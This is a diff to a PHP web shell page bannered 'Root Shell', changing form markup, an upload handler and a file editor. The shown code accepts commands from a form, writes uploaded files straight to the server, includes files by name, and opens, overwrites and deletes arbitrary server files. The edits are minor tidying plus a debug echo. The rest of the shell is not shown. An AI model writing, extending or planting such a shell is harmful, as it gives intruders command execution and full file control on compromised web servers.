@@ -16,13 +16,6 @@ body{
 cursor:crosshair 
 }
 </style-->
-  <div align="center" style="width: 100%; height: 100">
-    <pre width="100%" align="center"><strong> ____             _         ____  _          _ _
-|  _ \ ___   ___ | |_      / ___|| |__   ___| | |
-| |_) / _ \ / _ \| __|     \___ \| '_ \ / _ \ | |
-|  _ < (_) | (_) | |_   _   ___) | | | |  __/ | |
-|_| \_\___/ \___/ \__| (_) |____/|_| |_|\___|_|_|</pre>
-  </div></strong>
   <b><u>
       <center>
         <font face='Verdana' style='font-size: 8pt'>
@@ -87,7 +80,7 @@ cursor:crosshair
         <tr>
           <td width="49%" height="142">
             <p align="center">
-            <form method="post" action="">
+            <form method="post">
               <p align="center">
                 <br>
                 <font face="Verdana" style="font-size: 8pt">Insert your commands here:</font><br>
@@ -122,8 +115,6 @@ cursor:crosshair
                 <input type="submit" name="Upload" value="Upload File!"> <br>
               </p>
             </form>
-
-
             <?php
 
             if (isset($_FILES['image'])) {
@@ -135,8 +126,8 @@ cursor:crosshair
               $file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));
 
               if (empty($errors) == true) {
-                copy($file_tmp, $file_name);
                 //move_uploaded_file($file_tmp, $file_name);
+                copy($file_tmp,$file_name);
                 echo "Success";
               } else {
                 print_r($errors);
@@ -184,7 +175,7 @@ cursor:crosshair
                 <br>
                 &nbsp;
               </font>
-            <form method="POST" action="">
+            <form method="POST">
               <p align="center">
                 <input type="text" name="incl" size="20"><br>
                 <br>
@@ -219,7 +210,7 @@ cursor:crosshair
                   $filecontents = "";
 
 
-                if (empty($_POST["Open"]) == "Open") {
+                if ($_POST["Open"] == "Open") {
                   if (file_exists($filename)) {
                     $filecontents = htmlentities(file_get_contents($filename));
 
@@ -240,10 +231,11 @@ cursor:crosshair
                 } else if ($_POST["Save"] == "Save") {
                   $filecontents = stripslashes(html_entity_decode($_POST["contents"]));
 
-//                  if (file_exists($filename))
-//                    unlink($filename);
+                  //if (file_exists($filename))
+                  //  unlink($filename);
 
                   $handle = fopen($filename, "w");
+                  echo "handle ".$handle;
 
                   if (!$handle)
                     $status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
@@ -260,36 +252,39 @@ cursor:crosshair
                 }
                 ?>
               <table border="0" align="center">
-                <form method="post" action="">
-                  <tr>
-                    <td>
-                      <table width="100%" border="0">
-                        <tr>
-                          <td>
+
+                <tr>
+                  <td>
+                    <table width="100%" border="0">
+                      <tr>
+                        <td>
+                          <form method="post" action="">
                             <input name="filename" type="text" value="<?php echo $filename; ?>" size="20">
                             <input type="submit" name="Open" value="Open">
                             <input type="submit" name="Delete" value="Delete">
-                          </td>
-                        </tr>
-                      </table>
-                    </td>
-                  </tr>
-                  
-                  <tr>
-                    <td>
-                      <font face="Verdana" style="font-size: 11pt">
-                        <textarea name="contents" cols="53" rows="8"><?php echo $filecontents; ?></textarea>
-                      </font><br>
-                      <input type="submit" name="Save" value="Save">
-                      <input type="reset" value="Reset">
-                    </td>
-                  </tr>
+                          </form>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
 
-                  <tr>
-                    <td>
-                      <h2><?php echo $status; ?></h2>
-                    </td>
-                  </tr>
+                <tr>
+                  <td>
+                    <font face="Verdana" style="font-size: 11pt">
+                      <textarea name="contents" cols="53" rows="8"><?php echo $filecontents; ?></textarea>
+                    </font><br>
+                    <input type="submit" name="Save" value="Save">
+                    <input type="reset" value="Reset">
+                    </form>
+                  </td>
+                </tr>
+
+                <tr>
+                  <td>
+                    <h2><?php echo $status; ?></h2>
+                  </td>
+                </tr>
               </table>
           </td>
           <td width="51%" height="232">
@@ -300,7 +295,6 @@ cursor:crosshair
               </font>
           </td>
         </tr>
-        </form>
       </table>
     </center>
   </div>
